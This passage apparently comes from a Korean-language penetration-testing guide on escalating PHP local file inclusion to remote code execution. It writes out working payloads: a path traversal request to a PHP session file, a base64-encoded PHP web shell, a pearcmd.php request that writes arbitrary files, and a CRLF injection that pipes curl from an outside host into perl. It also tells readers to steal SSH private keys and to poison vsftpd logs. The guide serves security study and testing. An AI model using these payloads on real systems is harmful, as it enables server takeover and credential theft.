login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh를 통해

ssh가 활성화되어 있으면 (/proc/self/status & /etc/passwd)를 확인하여 어떤 사용자가 사용되는지 확인하고 **\<HOME>/.ssh/id_rsa**에 접근해 보세요.

### **vsftpd** _**로그**_를 통해

FTP 서버 vsftpd의 로그는 _**/var/log/vsftpd.log**_에 있습니다. Local File Inclusion (LFI) 취약점이 존재하고 노출된 vsftpd 서버에 접근할 수 있는 경우, 다음 단계를 고려할 수 있습니다:

1. 로그인 과정에서 username 필드에 PHP 페이로드를 주입합니다.
2. 주입 후, LFI를 이용하여 서버 로그 _**/var/log/vsftpd.log**_를 가져옵니다.

### php base64 filter를 통해 (base64 사용)

이 [기사](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64)에서 보여주듯, PHP base64 filter는 non-base64 문자를 무시합니다. 이를 사용해 파일 확장자 검사를 우회할 수 있습니다: base64 끝에 ".php"를 붙여 전달하면, filter는 "."를 무시하고 base64에 "php"를 추가합니다. 예시 페이로드는 다음과 같습니다:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### php filters를 통한 방법 (파일 필요 없음)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d)은 **php filters를 사용해 임의의 콘텐츠를 출력**할 수 있음을 설명합니다. 즉, 파일로 **작성하지 않고도** include에 사용할 **임의의 php code를 생성**할 수 있다는 뜻입니다.

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### segmentation fault를 통한 방법

**파일을 업로드**하면 `/tmp`에 **임시**로 저장되고, 같은 **요청에서** **segmentation fault**를 유발하면 **임시 파일이 삭제되지 않아** 해당 파일을 찾아볼 수 있습니다.

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Nginx 임시 파일 저장을 통한 방법

Local File Inclusion을 발견했고 **Nginx**가 PHP 앞에서 동작 중이라면, 다음 기법으로 **RCE**를 얻을 수 있습니다:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### PHP_SESSION_UPLOAD_PROGRESS를 통한 방법

Local File Inclusion을 발견했지만 **세션이 없고** `session.auto_start`가 `Off`인 경우에도, multipart POST 데이터에 **`PHP_SESSION_UPLOAD_PROGRESS`**를 포함하면 PHP가 **세션을 활성화**합니다. 이를 악용해 **RCE**를 얻을 수 있습니다:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Windows의 임시 파일 업로드를 통한 방법

Local File Inclusion을 발견했고 서버가 **Windows**에서 실행 중이라면 RCE를 얻을 가능성이 있습니다:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### `pearcmd.php` + URL args를 통한 방법

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), `/usr/local/lib/phppearcmd.php` 스크립트는 php docker images에 기본적으로 존재합니다. 또한 URL 파라미터에 `=`가 없으면 그 값을 인수로 사용하도록 되어 있어, URL을 통해 스크립트에 인수를 전달할 수 있습니다. 또한 [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)와 [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)도 참고하세요.

다음 요청은 `/tmp/hello.php`에 `<?=phpinfo()?>` 내용을 가진 파일을 생성합니다:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
다음은 CRLF vuln을 악용해 RCE를 획득하는 예입니다 (출처: [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo()를 통한 방법 (file_uploads = on)

만약 **Local File Inclusion**를 찾았고 **phpinfo()**를 노출하는 파일에서 file_uploads = on이라면 RCE를 얻을 수 있습니다:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure를 통한 방법

만약 **Local File Inclusion**를 찾았고 임시 파일의 경로를 **exfiltrate**할 수 있지만 **서버**가 포함할 파일에 PHP 마커가 있는지 **검사**하고 있다면, 이 **Race Condition**을 이용해 그 **검사**를 **bypass**할 수 있습니다:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### eternal waiting + bruteforce를 통한 방법

만약 LFI를 악용해 임시 파일을 **upload temporary files**하고 서버가 PHP 실행을 **hang**하게 만들 수 있다면, 몇 시간 동안 파일명을 **brute force**하여 임시 파일을 찾을 수 있습니다:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Fatal Error로

만약 `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` 중 어떤 파일이든 포함(include)하면 됩니다. (이 오류를 발생시키려면 동일한 파일을 2번 포함해야 합니다).

**이게 어떻게 유용한지 잘 모르겠지만 가능성은 있습니다.**\
_설령 PHP Fatal Error를 발생시켜도, 업로드된 PHP 임시 파일들은 삭제됩니다._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
